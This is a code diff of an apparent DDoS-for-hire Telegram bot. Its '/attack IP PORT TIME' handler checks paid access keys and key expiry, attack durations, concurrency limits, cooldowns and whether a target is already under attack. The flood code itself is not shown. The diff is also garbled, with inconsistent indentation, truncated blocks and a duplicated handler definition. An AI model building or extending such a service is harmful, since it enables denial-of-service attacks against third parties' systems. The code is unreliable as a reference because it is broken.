@@ -482,35 +482,35 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['attack'])
         def hosted_attack(msg):
-    uid = str(msg.chat.id)
-    if uid not in users:
-        hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
-        return
-    if not check_user_expiry(uid):
-        hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
-        return
-    args = msg.text.split()
-    if len(args) != 4:
-        hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
-        return
-    ip, port, duration = args[1], args[2], args[3]
-    if not validate_ip(ip):
-        hosted_bot.reply_to(msg, "❌ Invalid IP address!")
-        return
-    try:
-        port = int(port)
-        duration = int(duration)
-        if duration < 10 or duration > 300:
-            hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
-            return
-    except:
-        hosted_bot.reply_to(msg, "❌ Invalid port or time!")
-        return
+            uid = str(msg.chat.id)
+            if uid not in users:
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
+                return
+            if not check_user_expiry(uid):
+                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
+                return
+            args = msg.text.split()
+            if len(args) != 4:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
+                return
+            ip, port, duration = args[1], args[2], args[3]
+            if not validate_ip(ip):
+                hosted_bot.reply_to(msg, "❌ Invalid IP address!")
+                return
+            try:
+                port = int(port)
+                duration = int(duration)
+               if duration < 10 or duration > 300:
+                   hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
+                   return
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
+                return
     
-    total_active = get_total_active_count()
-    if total_active >= MAX_CONCURRENT:
-        hosted_bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks across ALL bots: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
-        return
+            total_active = get_total_active_count()
+            if total_active >= MAX_CONCURRENT:
+                hosted_bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks across ALL bots: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
+                 return
     
     now = time.time()
     active_in_this_bot = 0
@@ -522,30 +522,14 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             hosted_bot.reply_to(msg, f"❌ THIS BOT'S LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check")
             return
 
-if uid in hosted_cooldown_data:
-    remaining = hosted_cooldown_data[uid] - now
-    if remaining > 0:
-        hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
-        return
+    if uid in hosted_cooldown_data:
+        remaining = hosted_cooldown_data[uid] - now
+        if remaining > 0:
+            hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
+            return
 
-attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
-target_key = f"{ip}:{port}"
-finish_time = now + duration
+    attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
 
-target_under_attack = False
-if bot_token in hosted_bots:
-    for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
-        if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
-            target_under_attack = True
-            break
-if target_under_attack:
-    hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} is already being attacked.")
-    return
-
-hosted_cooldown_data[uid] = now + COOLDOWN_TIME
-if bot_token not in hosted_bots:
-    hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent}
-if "active_attacks" not in hosted_bots[bot_token]:
 @hosted_bot.message_handler(commands=['attack'])
 def hosted_attack(msg):
     uid = str(msg.chat.id)
